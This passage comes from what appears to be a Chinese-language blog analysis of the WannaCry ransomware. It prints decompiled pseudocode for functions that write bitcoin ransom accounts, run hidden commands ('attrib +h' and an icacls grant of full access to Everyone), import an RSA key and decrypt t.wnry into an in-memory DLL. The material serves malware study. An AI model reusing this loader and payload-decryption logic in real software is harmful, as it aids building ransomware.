operator">%</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 拷贝随机账户到目标内存  </span>result <span class="token operator">=</span> <span class="token function">ReadOrWriteFileToMem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>DstBuf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 写入c.wnry到内存  </span><span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数随机的将三个比特币账户中的一个写入c.wnry文件中</p><h3 id="5-2-5-ExeCmdCommand-命令行执行"><a href="#5-2-5-ExeCmdCommand-命令行执行" class="headerlink" title="5.2.5 ExeCmdCommand 命令行执行"></a>5.2.5 ExeCmdCommand 命令行执行</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">ExeCmdCommand</span><span class="token punctuation">(</span>LPSTR lpCommandLine<span class="token punctuation">,</span> DWORD dwMilliseconds<span class="token punctuation">,</span> LPDWORD lpExitCode<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">_STARTUPINFOA</span> StartupInfo<span class="token punctuation">;</span> <span class="token comment">//该结构用于指定新进程的主窗口特性  </span><span class="token keyword">struct</span> <span class="token class-name">_PROCESS_INFORMATION</span> ProcessInformation<span class="token punctuation">;</span> <span class="token comment">// [esp+4Ch] [ebp-10h]  </span>StartupInfo<span class="token punctuation">.</span>cb <span class="token operator">=</span> <span class="token number">68</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>StartupInfo<span class="token punctuation">.</span>lpReserved<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  ProcessInformation<span class="token punctuation">.</span>hProcess <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  ProcessInformation<span class="token punctuation">.</span>hThread <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  ProcessInformation<span class="token punctuation">.</span>dwProcessId <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  ProcessInformation<span class="token punctuation">.</span>dwThreadId <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  StartupInfo<span class="token punctuation">.</span>wShowWindow <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  StartupInfo<span class="token punctuation">.</span>dwFlags <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">CreateProcessA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> lpCommandLine<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x8000000u</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>StartupInfo<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ProcessInformation<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token comment">// 设置当前目录下的所有文件属性为隐藏 命令行参数错误 函数并未成功  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> dwMilliseconds <span class="token punctuation">)</span>                         <span class="token comment">// 条件不成立 跳转到关闭句柄处  </span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>ProcessInformation<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> dwMilliseconds<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token function">TerminateProcess</span><span class="token punctuation">(</span>ProcessInformation<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> lpExitCode <span class="token punctuation">)</span>  <span class="token function">GetExitCodeProcess</span><span class="token punctuation">(</span>ProcessInformation<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> lpExitCode<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>ProcessInformation<span class="token punctuation">.</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>ProcessInformation<span class="token punctuation">.</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在函数主题逻辑中利用到了两次ExeCmdCommand函数：</p><p>第一个创建了一个进程 并利用参数”attrib+h”<br>将当前目录下的所有文件设置为隐藏</p><p>第二个利用参数 “icacls ./grant Everyone:F /T /C /Q”添加用户并给予权限</p><h2 id="5-3-加载病毒核心操作"><a href="#5-3-加载病毒核心操作" class="headerlink" title="5.3 加载病毒核心操作"></a>5.3 加载病毒核心操作</h2><p>在这部分所涉及的函数的操作都只有一个目的，即利用dll文件中的导出函数，下面我们分步进行分析</p><h3 id="5-3-1-GetApis-获取必要的API函数"><a href="#5-3-1-GetApis-获取必要的API函数" class="headerlink" title="5.3.1 GetApis 获取必要的API函数"></a>5.3.1 GetApis 获取必要的API函数</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">GetApis</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  HMODULE KernelBase<span class="token punctuation">;</span> <span class="token comment">// eax  </span>HMODULE KernelAddr<span class="token punctuation">;</span> <span class="token comment">// edi  </span>FARPROC CloseHandle_Addr<span class="token punctuation">;</span> <span class="token comment">// eax  </span><span class="token keyword">signed</span> <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">GetCryptoAPIAddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                    <span class="token comment">// 获取CryptoAPI函数地址  </span><span class="token keyword">goto</span> LABEL_15<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> CreateFileW_Addr <span class="token punctuation">)</span>  <span class="token keyword">goto</span> LABEL_16<span class="token punctuation">;</span>  KernelBase <span class="token operator">=</span> <span class="token function">LoadLibraryA</span><span class="token punctuation">(</span>Kernel32<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 加载Kernel32.dll的基址  </span>KernelAddr <span class="token operator">=</span> KernelBase<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>KernelBase <span class="token punctuation">)</span>  <span class="token keyword">goto</span> LABEL_15<span class="token punctuation">;</span>  CreateFileW_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>KernelBase<span class="token punctuation">,</span> CreateFileW<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取文件操作的API函数地址  </span>WriteFile_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>KernelAddr<span class="token punctuation">,</span> WriteFile_0<span class="token punctuation">)</span><span class="token punctuation">;</span>  ReadFile_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">BOOL</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">,</span> LPVOID<span class="token punctuation">,</span> DWORD<span class="token punctuation">,</span> LPDWORD<span class="token punctuation">,</span> LPOVERLAPPED<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>  KernelAddr<span class="token punctuation">,</span>  ReadFile_0<span class="token punctuation">)</span><span class="token punctuation">;</span>  MoveFileW_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>KernelAddr<span class="token punctuation">,</span> MoveFileW<span class="token punctuation">)</span><span class="token punctuation">;</span>  MoveFileExW_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>KernelAddr<span class="token punctuation">,</span> MoveFileExW<span class="token punctuation">)</span><span class="token punctuation">;</span>  DeleteFileW_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>KernelAddr<span class="token punctuation">,</span> DeleteFileW<span class="token punctuation">)</span><span class="token punctuation">;</span>  CloseHandle_Addr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span>KernelAddr<span class="token punctuation">,</span> CloseHandle_0<span class="token punctuation">)</span><span class="token punctuation">;</span>  Int_CloseHandle_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>CloseHandle_Addr<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>CreateFileW_Addr <span class="token punctuation">)</span>  <span class="token keyword">goto</span> LABEL_15<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> WriteFile_Addr <span class="token operator">&amp;&amp;</span> ReadFile_Addr <span class="token operator">&amp;&amp;</span> MoveFileW_Addr <span class="token operator">&amp;&amp;</span> MoveFileExW_Addr <span class="token operator">&amp;&amp;</span> DeleteFileW_Addr <span class="token operator">&amp;&amp;</span> CloseHandle_Addr <span class="token punctuation">)</span>  LABEL_16<span class="token operator">:</span>  result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>  LABEL_15<span class="token operator">:</span>  result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此函数的主要目的就是为后面的操作获取常用API函数的地址例如-CreateFileW。</p><h3 id="5-3-2-CDatabase-CDataBase-构造函数"><a href="#5-3-2-CDatabase-CDataBase-构造函数" class="headerlink" title="5.3.2 CDatabase::CDataBase 构造函数"></a>5.3.2 CDatabase::CDataBase 构造函数</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>__thiscall CDatabase<span class="token operator">::</span><span class="token function">CDatabase</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>this<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment">// esi  </span>v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>this<span class="token punctuation">;</span>  <span class="token function">Crt_InitializeCriticalSection</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>this <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 初始化临界区对象  </span><span class="token function">Crt_InitializeCriticalSection</span><span class="token punctuation">(</span>v1 <span class="token operator">+</span> <span class="token number">44</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v1<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>初始化两个用于线程同步的临界区对象CDatabase</p><h3 id="5-3-3-ImportKeyAndAllocMem-导入密钥并申请空间"><a href="#5-3-3-ImportKeyAndAllocMem-导入密钥并申请空间" class="headerlink" title="5.3.3 ImportKeyAndAllocMem 导入密钥并申请空间"></a>5.3.3 ImportKeyAndAllocMem 导入密钥并申请空间</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __thiscall <span class="token function">ImportKeyAndAllocMem</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>this<span class="token punctuation">,</span> LPCSTR FileName<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  _DWORD <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// esi  </span>HGLOBAL hGlobal<span class="token punctuation">;</span> <span class="token comment">// eax  </span>HGLOBAL hGlobal_2<span class="token punctuation">;</span> <span class="token comment">// eax  </span>v4 <span class="token operator">=</span> this<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">ImportPrivateKey</span><span class="token punctuation">(</span>this <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> FileName<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token comment">// 导入私钥  </span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> FileName <span class="token punctuation">)</span>  <span class="token function">ImportPrivateKey</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  hGlobal <span class="token operator">=</span> <span class="token function">GlobalAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 申请一块全局的固定内存块  </span>v4<span class="token punctuation">[</span><span class="token number">306</span><span class="token punctuation">]</span> <span class="token operator">=</span> hGlobal<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>hGlobal <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  hGlobal_2 <span class="token operator">=</span> <span class="token function">GlobalAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">307</span><span class="token punctuation">]</span> <span class="token operator">=</span> hGlobal_2<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>hGlobal_2 <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">309</span><span class="token punctuation">]</span> <span class="token operator">=</span> a3<span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">308</span><span class="token punctuation">]</span> <span class="token operator">=</span> a4<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数完成了两项工作：</p><ol><li><p> 导入 RSA 私钥，用来解密后面的相关文件</p></li><li><p> 申请了两块大小为 0x100000 的内存</p></li></ol><h3 id="5-3-4-DecryptFile-解密t-wnry"><a href="#5-3-4-DecryptFile-解密t-wnry" class="headerlink" title="5.3.4 DecryptFile 解密t.wnry"></a>5.3.4 DecryptFile 解密t.wnry</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __thiscall <span class="token function">DecryptFile</span><span class="token punctuation">(</span><span class="token keyword">void</span> this<span class="token punctuation">,</span> LPCSTR lpFileName<span class="token punctuation">,</span> <span class="token keyword">int</span> DecryptFileSize<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  hFile <span class="token operator">=</span> <span class="token function">CreateFileA</span><span class="token punctuation">(</span>lpFileName<span class="token punctuation">,</span> GENERIC_READ<span class="token punctuation">,</span> FILE_SHARE_READ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> OPEN_EXISTING<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 以只读的方式打开t.wnry  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> hFile <span class="token operator">!=</span> <span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span>INVALID_HANDLE_VALUE <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token function">GetFileSizeEx</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FileSize<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 获取文件大小  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> FileSize<span class="token punctuation">.</span>QuadPart <span class="token operator">&lt;=</span> <span class="token number">0x6400000</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ReadFile_Addr</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpBuffer<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpNumberOfBytesRead<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 读取8个字节的文件内容 读取的内容为WANACRY!  </span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">memcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lpBuffer<span class="token punctuation">,</span> aWanacry<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ReadFile_Addr</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Buffer<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpNumberOfBytesRead<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 继续向后读取4个字节的内容 读取的内容为0x100  </span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> Buffer <span class="token operator">==</span> <span class="token number">0x100</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ReadFile_Addr</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> pBuffer<span class="token punctuation">[</span><span class="token number">306</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpNumberOfBytesRead<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 读取0x100个字节  </span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ReadFile_Addr</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buff<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpNumberOfBytesRead<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 再次读取4个字节 内容为04  </span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ReadFile_Addr</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpNumberOfBytesRead<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 继续往后读8字节->10000  </span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> buffer <span class="token operator">&lt;=</span> <span class="token number">0x6400000</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">DecryptData</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pBuffer <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>BYTE <span class="token operator">*</span><span class="token punctuation">)</span>pBuffer<span class="token punctuation">[</span><span class="token number">306</span><span class="token punctuation">]</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>DecryptDatas<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>DataSize<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 对读取的0x100个字节进行解密  </span><span class="token punctuation">&#123;</span>  <span class="token function">sub_402A76</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pBuffer <span class="token operator">+</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>DecryptDatas<span class="token punctuation">,</span> Src<span class="token punctuation">,</span> DataSize<span class="token punctuation">,</span> <span class="token number">0x10u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  hGlobal_3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">GlobalAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> hGlobal_3 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ReadFile_Addr</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> pBuffer<span class="token punctuation">[</span><span class="token number">306</span><span class="token punctuation">]</span><span class="token punctuation">,</span> FileSize<span class="token punctuation">.</span>LowPart<span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpNumberOfBytesRead<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">// 读取0x10000个字节  </span><span class="token operator">&amp;&amp;</span> lpNumberOfBytesRead  <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>buffer <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token function">SHIDWORD</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> lpNumberOfBytesRead <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>buffer<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  pFileAddr <span class="token operator">=</span> hGlobal_3<span class="token punctuation">;</span>  <span class="token function">DecryptPEFile</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pBuffer <span class="token operator">+</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pBuffer<span class="token punctuation">[</span><span class="token number">306</span><span class="token punctuation">]</span><span class="token punctuation">,</span> hGlobal_3<span class="token punctuation">,</span> lpNumberOfBytesRead<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将读取的内容解密成一个PE文件  </span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>DecryptFileSize <span class="token operator">=</span> buffer<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">local_unwind2</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>ms_exc<span class="token punctuation">.</span>registration<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> pFileAddr<span class="token punctuation">;</span>                             <span class="token comment">// 返回解析出的文件首地址  </span><span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在函数执行过程中，我们一直对t.wnry文件执行读取操作，每读取一个片段到内存边利用已有的RSA私钥进行解密，返回解密后的文件内容。</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image17.png" class="" width="17"><p>图十五：OD查看函数返回值</p><p>查看解密后的文件，是一个PE文件，通过对文件源码和结构的分析，判断它是一个dll文件，且是先前资源包中的t_wnry.dll。</p><h3 id="5-3-5-WriteAllocMem-拷贝PE文件到内存"><a href="#5-3-5-WriteAllocMem-拷贝PE文件到内存" class="headerlink" title="5.3.5 WriteAllocMem 拷贝PE文件到内存"></a>5.3.5 WriteAllocMem 拷贝PE文件到内存</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>__cdecl <span class="token function">sub_4021E9</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>pFileBase<span class="token punctuation">,</span> <span class="token keyword">int</span> FileSize<span class="token punctuation">,</span> <span class="token keyword">int</span> VirtualAlloc_Addr<span class="token punctuation">,</span> <span class="token keyword">int</span> VirtualFree_Addr<span class="token punctuation">,</span> <span class="token keyword">int</span> LoadLibraryA_Addr<span class="token punctuation">,</span> <span class="token keyword">int</span> GetProcAddress_Addr<span class="token punctuation">,</span> <span class="token keyword">int</span> FreeLibrary_Addr<span class="token punctuation">,</span> <span class="token keyword">int</span> a8<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  v28 <span class="token operator">=</span> <span class="token number">0</span><span class="token 